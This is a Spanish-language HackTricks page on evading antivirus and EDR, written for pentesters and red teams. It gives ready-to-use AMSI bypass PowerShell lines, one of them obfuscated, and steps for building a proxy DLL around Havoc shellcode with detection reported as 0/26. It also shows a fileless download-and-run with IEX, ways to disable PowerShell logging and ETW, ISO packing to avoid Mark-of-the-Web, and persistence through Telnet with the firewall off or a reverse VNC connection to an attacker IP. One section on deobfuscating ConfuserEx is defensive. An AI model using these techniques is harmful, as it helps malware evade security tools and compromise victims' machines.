# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**¡Esta página fue escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para detener el funcionamiento de Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para detener el funcionamiento de Windows Defender simulando otro AV.
- [Desactivar Defender si eres administrador](basic-powershell-for-pentesters/README.md)

## **Metodología de Evasión de AV**

Actualmente, los AV utilizan diferentes métodos para verificar si un archivo es malicioso o no, detección estática, análisis dinámico y, para los EDR más avanzados, análisis de comportamiento.

### **Detección estática**

La detección estática se logra al marcar cadenas maliciosas conocidas o arreglos de bytes en un binario o script, y también extrayendo información del propio archivo (por ejemplo, descripción del archivo, nombre de la empresa, firmas digitales, icono, suma de verificación, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te atrapen más fácilmente, ya que probablemente han sido analizadas y marcadas como maliciosas. Hay un par de formas de eludir este tipo de detección:

- **Cifrado**

Si cifras el binario, no habrá forma de que el AV detecte tu programa, pero necesitarás algún tipo de cargador para descifrar y ejecutar el programa en memoria.

- **Ofuscación**

A veces, todo lo que necesitas hacer es cambiar algunas cadenas en tu binario o script para que pase el AV, pero esto puede ser una tarea que consume tiempo dependiendo de lo que estés tratando de ofuscar.

- **Herramientas personalizadas**

Si desarrollas tus propias herramientas, no habrá firmas malas conocidas, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> Una buena manera de verificar contra la detección estática de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente, divide el archivo en múltiples segmentos y luego le pide a Defender que escanee cada uno individualmente, de esta manera, puede decirte exactamente cuáles son las cadenas o bytes marcados en tu binario.

Te recomiendo encarecidamente que revises esta [lista de reproducción de YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre evasión práctica de AV.

### **Análisis dinámico**

El análisis dinámico es cuando el AV ejecuta tu binario en un sandbox y observa actividades maliciosas (por ejemplo, intentar descifrar y leer las contraseñas de tu navegador, realizar un minidump en LSASS, etc.). Esta parte puede ser un poco más complicada de manejar, pero aquí hay algunas cosas que puedes hacer para evadir sandboxes.

- **Dormir antes de la ejecución** Dependiendo de cómo se implemente, puede ser una gran manera de eludir el análisis dinámico del AV. Los AV tienen un tiempo muy corto para escanear archivos para no interrumpir el flujo de trabajo del usuario, por lo que usar largos períodos de espera puede perturbar el análisis de los binarios. El problema es que muchos sandboxes de AV pueden simplemente omitir el sueño dependiendo de cómo se implemente.
- **Verificar los recursos de la máquina** Generalmente, los sandboxes tienen muy pocos recursos para trabajar (por ejemplo, < 2GB de RAM), de lo contrario, podrían ralentizar la máquina del usuario. También puedes ser muy creativo aquí, por ejemplo, verificando la temperatura de la CPU o incluso las velocidades del ventilador, no todo estará implementado en el sandbox.
- **Comprobaciones específicas de la máquina** Si deseas dirigirte a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes hacer una verificación en el dominio de la computadora para ver si coincide con el que has especificado, si no coincide, puedes hacer que tu programa salga.

Resulta que el nombre de la computadora del Sandbox de Microsoft Defender es HAL9TH, así que puedes verificar el nombre de la computadora en tu malware antes de la detonación, si el nombre coincide con HAL9TH, significa que estás dentro del sandbox de Defender, por lo que puedes hacer que tu programa salga.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algunos otros consejos realmente buenos de [@mgeeky](https://twitter.com/mariuszbit) para ir contra los Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como hemos dicho antes en esta publicación, **las herramientas públicas** eventualmente **serán detectadas**, así que deberías preguntarte algo:

Por ejemplo, si deseas volcar LSASS, **¿realmente necesitas usar mimikatz**? O podrías usar un proyecto diferente que sea menos conocido y que también voltee LSASS.

La respuesta correcta probablemente sea la última. Tomando mimikatz como ejemplo, probablemente sea una de, si no la más, marcada pieza de malware por los AV y EDR, mientras que el proyecto en sí es súper genial, también es una pesadilla trabajar con él para eludir los AV, así que solo busca alternativas para lo que estás tratando de lograr.

> [!TIP]
> Al modificar tus cargas útiles para la evasión, asegúrate de **desactivar la presentación automática de muestras** en Defender, y por favor, en serio, **NO SUBAS A VIRUSTOTAL** si tu objetivo es lograr evasión a largo plazo. Si deseas verificar si tu carga útil es detectada por un AV en particular, instálalo en una VM, intenta desactivar la presentación automática de muestras y pruébalo allí hasta que estés satisfecho con el resultado.

## EXEs vs DLLs

Siempre que sea posible, **prioriza el uso de DLLs para la evasión**, en mi experiencia, los archivos DLL son generalmente **mucho menos detectados** y analizados, por lo que es un truco muy simple de usar para evitar la detección en algunos casos (si tu carga útil tiene alguna forma de ejecutarse como una DLL, por supuesto).

Como podemos ver en esta imagen, una carga útil DLL de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que la carga útil EXE tiene una tasa de detección de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparación de antiscan.me de una carga útil normal de Havoc EXE vs una normal de Havoc DLL</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## Carga lateral de DLL y Proxying

**La carga lateral de DLL** aprovecha el orden de búsqueda de DLL utilizado por el cargador al posicionar tanto la aplicación víctima como la(s) carga útil(es) maliciosa(s) una al lado de la otra.

Puedes verificar programas susceptibles a la carga lateral de DLL usando [Siofra](https://github.com/Cybereason/siofra) y el siguiente script de powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Recomiendo encarecidamente que **explores los programas DLL Hijackable/Sideloadable tú mismo**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas DLL Sideloadable de conocimiento público, podrías ser atrapado fácilmente.

Simplemente colocar una DLL maliciosa con el nombre que un programa espera cargar, no cargará tu payload, ya que el programa espera algunas funciones específicas dentro de esa DLL. Para solucionar este problema, utilizaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía las llamadas que un programa hace desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y pudiendo manejar la ejecución de tu payload.

Estaré utilizando el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una plantilla de código fuente DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

¡Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como la DLL proxy tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo lo llamaría un éxito.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Recomiendo encarecidamente** que veas el [VOD de twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también el [video de ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender más sobre lo que hemos discutido en mayor profundidad.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze es un kit de herramientas de payload para eludir EDRs utilizando procesos suspendidos, syscalls directos y métodos de ejecución alternativos`

Puedes usar Freeze para cargar y ejecutar tu shellcode de manera sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es solo un juego de gato y ratón, lo que funciona hoy podría ser detectado mañana, así que nunca confíes solo en una herramienta, si es posible, intenta encadenar múltiples técnicas de evasión.

## AMSI (Interfaz de Escaneo Anti-Malware)

AMSI fue creado para prevenir "[malware sin archivos](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AV solo podían escanear **archivos en disco**, así que si podías ejecutar cargas útiles **directamente en memoria**, el AV no podía hacer nada para prevenirlo, ya que no tenía suficiente visibilidad.

La función AMSI está integrada en estos componentes de Windows.

- Control de Cuentas de Usuario, o UAC (elevación de EXE, COM, MSI o instalación de ActiveX)
- PowerShell (scripts, uso interactivo y evaluación de código dinámico)
- Windows Script Host (wscript.exe y cscript.exe)
- JavaScript y VBScript
- Macros de Office VBA

Permite a las soluciones antivirus inspeccionar el comportamiento de los scripts al exponer el contenido del script en una forma que es tanto sin cifrar como sin ofuscar.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` producirá la siguiente alerta en Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota cómo antepone `amsi:` y luego la ruta al ejecutable desde el cual se ejecutó el script, en este caso, powershell.exe

No dejamos ningún archivo en disco, pero aún así nos atraparon en memoria debido a AMSI.

Además, a partir de **.NET 4.8**, el código C# también se ejecuta a través de AMSI. Esto incluso afecta a `Assembly.Load(byte[])` para la ejecución en memoria. Por eso se recomienda usar versiones anteriores de .NET (como 4.7.2 o inferiores) para la ejecución en memoria si deseas evadir AMSI.

Hay un par de formas de eludir AMSI:

- **Ofuscación**

Dado que AMSI funciona principalmente con detecciones estáticas, por lo tanto, modificar los scripts que intentas cargar puede ser una buena manera de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tiene múltiples capas, por lo que la ofuscación podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan sencillo evadir. Aunque, a veces, todo lo que necesitas hacer es cambiar un par de nombres de variables y estarás bien, así que depende de cuánto se haya marcado algo.

- **Evasión de AMSI**

Dado que AMSI se implementa cargando un DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularlo fácilmente incluso ejecutándose como un usuario sin privilegios. Debido a este defecto en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el escaneo de AMSI.

**Forzar un Error**

Forzar que la inicialización de AMSI falle (amsiInitFailed) resultará en que no se inicie ningún escaneo para el proceso actual. Originalmente, esto fue divulgado por [Matt Graeber](https://twitter.com/mattifestation) y Microsoft ha desarrollado una firma para prevenir un uso más amplio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Todo lo que se necesitó fue una línea de código de powershell para hacer que AMSI fuera inutilizable para el proceso de powershell actual. Esta línea, por supuesto, ha sido marcada por AMSI mismo, por lo que se necesita alguna modificación para usar esta técnica.

Aquí hay un bypass de AMSI modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Ten en cuenta que esto probablemente será marcado una vez que se publique esta entrada, así que no deberías publicar ningún código si tu plan es permanecer indetectado.

**Memory Patching**

Esta técnica fue descubierta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) y consiste en encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada proporcionada por el usuario) y sobrescribirla con instrucciones para devolver el código para E_INVALIDARG, de esta manera, el resultado del escaneo real devolverá 0, que se interpreta como un resultado limpio.

> [!TIP]
> Por favor, lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.

También hay muchas otras técnicas utilizadas para eludir AMSI con PowerShell, consulta [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) y [**este repositorio**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender más sobre ellas.

Esta herramienta [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) también genera scripts para eludir AMSI.

**Remove the detected signature**

Puedes usar una herramienta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la firma de AMSI detectada de la memoria del proceso actual. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la firma de AMSI y luego sobrescribiéndola con instrucciones NOP, eliminándola efectivamente de la memoria.

**AV/EDR products that uses AMSI**

Puedes encontrar una lista de productos AV/EDR que utilizan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin ser escaneado por AMSI. Puedes hacer esto:
```bash
powershell.exe -version 2
```
## PS Logging

El registro de PowerShell es una función que te permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para fines de auditoría y solución de problemas, pero también puede ser un **problema para los atacantes que quieren evadir la detección**.

Para eludir el registro de PowerShell, puedes usar las siguientes técnicas:

- **Deshabilitar la transcripción de PowerShell y el registro de módulos**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Usar PowerShell versión 2**: Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin ser escaneado por AMSI. Puedes hacer esto: `powershell.exe -version 2`
- **Usar una sesión de PowerShell no administrada**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para iniciar un PowerShell sin defensas (esto es lo que usa `powerpick` de Cobalt Strike).

## Obfuscation

> [!TIP]
> Varias técnicas de ofuscación se basan en cifrar datos, lo que aumentará la entropía del binario, lo que facilitará que los AV y EDR lo detecten. Ten cuidado con esto y tal vez solo aplica cifrado a secciones específicas de tu código que sean sensibles o necesiten ser ocultadas.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Al analizar malware que utiliza ConfuserEx 2 (o bifurcaciones comerciales), es común enfrentarse a varias capas de protección que bloquearán descompiladores y sandboxes. El flujo de trabajo a continuación restaura de manera confiable **un IL casi original** que luego puede ser descompilado a C# en herramientas como dnSpy o ILSpy.

1.  Eliminación de anti-tampering – ConfuserEx cifra cada *cuerpo de método* y lo descifra dentro del *constructor estático* del *módulo* (`<Module>.cctor`). Esto también parchea el checksum PE, por lo que cualquier modificación hará que el binario se bloquee. Usa **AntiTamperKiller** para localizar las tablas de metadatos cifradas, recuperar las claves XOR y reescribir un ensamblado limpio:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La salida contiene los 6 parámetros anti-tampering (`key0-key3`, `nameHash`, `internKey`) que pueden ser útiles al construir tu propio descompresor.

2.  Recuperación de símbolos / flujo de control – alimenta el archivo *limpio* a **de4dot-cex** (una bifurcación de de4dot que es consciente de ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – selecciona el perfil de ConfuserEx 2
• de4dot deshará la aplanación del flujo de control, restaurará los espacios de nombres, clases y nombres de variables originales y descifrará cadenas constantes.

3.  Eliminación de llamadas proxy – ConfuserEx reemplaza las llamadas directas a métodos con envolturas ligeras (también conocidas como *llamadas proxy*) para romper aún más la descompilación. Elimínalas con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Después de este paso, deberías observar API .NET normales como `Convert.FromBase64String` o `AES.Create()` en lugar de funciones de envoltura opacas (`Class8.smethod_10`, …).

4.  Limpieza manual – ejecuta el binario resultante bajo dnSpy, busca grandes blobs Base64 o el uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar la carga útil *real*. A menudo, el malware lo almacena como un arreglo de bytes codificado TLV inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin** necesidad de ejecutar la muestra maliciosa – útil al trabajar en una estación de trabajo fuera de línea.

> 🛈  ConfuserEx produce un atributo personalizado llamado `ConfusedByAttribute` que puede ser utilizado como un IOC para clasificar automáticamente muestras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador de C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de ofrecer una mayor seguridad del software a través de [ofuscación de código](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y protección contra manipulaciones.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin usar ninguna herramienta externa y sin modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Agrega una capa de operaciones ofuscadas generadas por el marco de metaprogramación de plantillas de C++ que hará que la vida de la persona que quiera crackear la aplicación sea un poco más difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador binario x64 que puede ofuscar varios archivos pe diferentes, incluyendo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un motor de código metamórfico simple para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un marco de ofuscación de código de grano fino para lenguajes compatibles con LLVM utilizando ROP (programación orientada a retorno). ROPfuscator ofusca un programa a nivel de código de ensamblador transformando instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un Crypter PE de .NET escrito en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

Es posible que hayas visto esta pantalla al descargar algunos ejecutables de internet y ejecutarlos.

Microsoft Defender SmartScreen es un mecanismo de seguridad destinado a proteger al usuario final contra la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente con un enfoque basado en la reputación, lo que significa que las aplicaciones descargadas poco comúnmente activarán SmartScreen, alertando y evitando que el usuario final ejecute el archivo (aunque el archivo aún se puede ejecutar haciendo clic en Más información -> Ejecutar de todos modos).

**MoTW** (Marca de la Web) es un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con el nombre de Zone.Identifier que se crea automáticamente al descargar archivos de internet, junto con la URL desde la que se descargó.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobando el ADS Zone.Identifier para un archivo descargado de internet.</p></figcaption></figure>

> [!TIP]
> Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **confiable** **no activarán SmartScreen**.

Una forma muy efectiva de evitar que tus cargas útiles obtengan la Marca de la Web es empaquetarlas dentro de algún tipo de contenedor como un ISO. Esto sucede porque la Marca de la Web (MOTW) **no puede** aplicarse a volúmenes **no NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta cargas útiles en contenedores de salida para evadir la Marca de la Web.

Ejemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aquí hay una demostración para eludir SmartScreen empaquetando cargas útiles dentro de archivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un poderoso mecanismo de registro en Windows que permite a las aplicaciones y componentes del sistema **registrar eventos**. Sin embargo, también puede ser utilizado por productos de seguridad para monitorear y detectar actividades maliciosas.

De manera similar a cómo se desactiva (elude) AMSI, también es posible hacer que la función **`EtwEventWrite`** del proceso de espacio de usuario regrese inmediatamente sin registrar ningún evento. Esto se hace parcheando la función en memoria para que regrese de inmediato, deshabilitando efectivamente el registro de ETW para ese proceso.

Puedes encontrar más información en **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) y [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.

## C# Assembly Reflection

Cargar binarios de C# en memoria se conoce desde hace bastante tiempo y sigue siendo una excelente manera de ejecutar tus herramientas de post-explotación sin ser detectado por AV.

Dado que la carga útil se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.

La mayoría de los frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya ofrecen la capacidad de ejecutar ensamblados de C# directamente en memoria, pero hay diferentes formas de hacerlo:

- **Fork\&Run**

Esto implica **generar un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar tu código malicioso y, cuando termines, matar el nuevo proceso. Esto tiene tanto sus beneficios como sus desventajas. El beneficio del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso de implante Beacon. Esto significa que si algo en nuestra acción de post-explotación sale mal o es detectado, hay una **mucho mayor posibilidad** de que nuestro **implante sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser atrapado por **Detecciones Comportamentales**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Se trata de inyectar el código malicioso de post-explotación **en su propio proceso**. De esta manera, puedes evitar tener que crear un nuevo proceso y que sea escaneado por AV, pero la desventaja es que si algo sale mal con la ejecución de tu carga útil, hay una **mucho mayor posibilidad** de **perder tu beacon** ya que podría fallar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si deseas leer más sobre la carga de ensamblados de C#, consulta este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

También puedes cargar ensamblados de C# **desde PowerShell**, consulta [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y el video de [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Usando Otros Lenguajes de Programación

Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso utilizando otros lenguajes al dar a la máquina comprometida acceso **al entorno del intérprete instalado en el recurso compartido SMB controlado por el atacante**.

Al permitir el acceso a los binarios del intérprete y al entorno en el recurso compartido SMB, puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.

El repositorio indica: Defender aún escanea los scripts, pero al utilizar Go, Java, PHP, etc., tenemos **más flexibilidad para eludir firmas estáticas**. Las pruebas con scripts de shell reverso aleatorios no ofuscados en estos lenguajes han demostrado ser exitosas.

## TokenStomping

Token stomping es una técnica que permite a un atacante **manipular el token de acceso o un producto de seguridad como un EDR o AV**, permitiéndoles reducir sus privilegios para que el proceso no muera, pero no tenga permisos para verificar actividades maliciosas.

Para prevenir esto, Windows podría **impedir que procesos externos** obtengan manejadores sobre los tokens de procesos de seguridad.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Usando Software de Confianza

### Chrome Remote Desktop

Como se describe en [**esta publicación de blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es fácil simplemente desplegar Chrome Remote Desktop en la PC de la víctima y luego usarlo para tomar el control y mantener la persistencia:
1. Descarga desde https://remotedesktop.google.com/, haz clic en "Configurar a través de SSH", y luego haz clic en el archivo MSI para Windows para descargar el archivo MSI.
2. Ejecuta el instalador en silencio en la víctima (se requiere administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Regresa a la página de Chrome Remote Desktop y haz clic en siguiente. El asistente te pedirá que autorices; haz clic en el botón Autorizar para continuar.
4. Ejecuta el parámetro dado con algunos ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota el parámetro pin que permite establecer el pin sin usar la GUI).

## Evasión Avanzada

La evasión es un tema muy complicado, a veces tienes que tener en cuenta muchas fuentes diferentes de telemetría en un solo sistema, por lo que es prácticamente imposible permanecer completamente indetectado en entornos maduros.

Cada entorno al que te enfrentes tendrá sus propias fortalezas y debilidades.

Te animo a que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener una base sobre técnicas de evasión más avanzadas.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasión en Profundidad.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Técnicas Antiguas**

### **Ver qué partes encuentra Defender como maliciosas**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **eliminará partes del binario** hasta que **descubra qué parte Defender** está encontrando como maliciosa y te lo dividirá.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred) con un servicio web abierto que ofrece el servicio en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Servidor Telnet**

Hasta Windows 10, todos los Windows venían con un **servidor Telnet** que podías instalar (como administrador) haciendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que **inicie** cuando se arranque el sistema y **ejecuta** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar el puerto telnet** (sigiloso) y desactivar el firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo de: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (quieres las descargas bin, no la instalación)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Habilita la opción _Disable TrayIcon_
- Establece una contraseña en _VNC Password_
- Establece una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo **nuevo** creado _**UltraVNC.ini**_ dentro de la **víctima**

#### **Conexión inversa**

El **atacante** debe **ejecutar dentro** de su **host** el binario `vncviewer.exe -listen 5900` para que esté **preparado** para capturar una **conexión VNC** inversa. Luego, dentro de la **víctima**: Inicia el daemon winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo no debes hacer algunas cosas

